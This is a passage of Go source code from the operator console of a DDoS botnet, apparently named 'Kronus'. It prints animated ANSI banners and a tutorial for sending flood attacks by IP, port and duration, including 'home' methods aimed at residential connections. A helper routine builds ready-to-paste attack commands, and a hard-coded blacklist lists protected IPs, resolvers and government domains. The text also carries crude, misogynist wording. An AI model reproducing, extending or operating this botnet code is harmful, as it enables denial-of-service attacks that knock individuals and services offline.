            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[34m           / == /       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |  |        \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[99m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m|                         |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[97m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | ;  :|    nuke          \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat bitch\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat bitch got\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat bitch got \033[1;49;35mNUKED\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
		}//if userInfo.admin == 1 && cmd == "ADDREG"
				 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 			  
		if err != nil || cmd == "tut" || cmd == "TUT" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
		    this.conn.Write([]byte("\033[01;35m ╔══════════════════════════════════════════════════════════════════════╗  \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m                 --HOW TO USE KRONUS BOTNET--                         \033[01;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m For All the Commands Type Help then At the top there is              \033[01;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m All The Commands and Functions Remember to stretch out your screen   \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m                                                                      \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m RAW BOTNET ATTACK EX: /method ip time dport=port                     \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m Just Type attack then u can go through the                           \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m reg-web-bypass-custom methods and choose which one u wanna do        \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m                                                                      \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m Best HOME METHOD IS:/gta-home|If You Have More questions just msg Me \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m======================================================================\033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m  Type API to list All the API Methods And Just Copy paste the method \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m  Because It have to be All In CAPS for ex: HYDRA-RAPE                \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m  And Just Do The Home Methods for homes and No Spamming!!            \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m                                                                      \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m  API ATTACK: !api-send then Click ENTER then Fill in the Info        \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m  The Method Have to Be ALL in CAPS that is really important!         \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m                                                                      \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║\033[1;49;32m  After Reading This Type TOS! If You Do Not wanna Get Banned         \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ╚══════════════════════════════════════════════════════════════════════╝ \033[0m \r\n"))
            continue
        }
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/	
		if err != nil || cmd == "BOOTHELP" || cmd == "boothelp" {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[00;1;95mIP: "))
			iptohit, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[1;49;35m║\033[00;1;95mPort: "))
			porttohit, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[1;49;35m║\033[00;1;95mTime: "))
			timetohit, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("                                \033[1;49;35m║\033[00;1;95mCopy And Paste To Send The Attack\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[1;49;35m║\033[00;1;95m/home " + iptohit + " " + timetohit + " dport=" + porttohit + "\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
 		if strings.Contains(cmd, "@") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mCrash Attempt Logged!\033[0m\r\n"))
			continue
		}
		
		if strings.HasPrefix(cmd, "-") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mCrash Attempt Logged!\033[0m\r\n"))
			continue
		}

		if strings.HasSuffix(cmd, "117.27.239.28") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mInvalid Flag!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "ovh.com") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mAttempt Logged!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ",") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mOne Attack At A Time!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "1.1.1.1") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "8.8.8.8") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

        if strings.Contains(cmd, "9.9.9.9") {
            this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

		if strings.Contains(cmd, ".ca") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".us") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".uk") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".au") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".gov") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "nfoservers.com") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "64.94.238.13") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "216.52.148.4") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "66.150.214.8") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "31.186.250.100") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "66.150.188.101") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "63.251.20.100") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "joker") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "192.223.25.100") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.2") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.83") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "117.27.239.28") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.88") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.84") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.8") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.7") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.75") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "109.201.148.62") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}
        if strings.Contains(cmd, "117.27.239.154") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}
	    if strings.Contains(cmd, "117.27.239.200") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}
	    if strings.Contains(cmd, "117.27.239.209") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}
		if strings.Contains(cmd, "117.27.239.155") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}
	    if strings.Contains(cmd, "117.27.239.28") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}
		if strings.Contains(cmd, "75.75.75.75") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "dstat") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "pornhub") {
			this.conn.Write([]byte("                                \033[1;49;35m║\033[1;49;35mLets Think About This...\033[0m\r\n"))
			continue
		}

		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/
			if err != nil || cmd == "banner" || cmd == "BAN" || cmd == "banners" || cmd == "BANNERS" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;32m                                   ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                                   ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                                   ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                      \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ╔═════════════════\033[1;49;32m════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞TROLL - Troll b\033[1;49;32manner1              ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞REAPER -  reaper ba\033[1;49;32mnner            ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞BATMAN -  batman ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞CAYOSIN - cayosin ba\033[1;49;32mnner           ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞SAO -  sao ba\033[1;49;32mnner                  ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞HOHO -  hoho ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞NEKO -  neko ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞KATANA -  katana ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞TIMEOUT - timeout ba\033[1;49;32mnner           ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞OFFLINE - offline ba\033[1;49;32mnner           ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞PUSSY -  pussy ba\033[1;49;32mnner              ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞BEASTMODE -  beastmode ba\033[1;49;32mnner      ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ╚═════════════════\033[1;49;32m════════════════════╝\033[0m \r\n"))
			
			continue
        }//BANNERS
           /*--------------------------------------------------------------------------------------------------------------------------------------------*/         
			if err != nil || cmd == "banner2" || cmd == "BAN2" || cmd == "banners2" || cmd == "BANNERS2" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
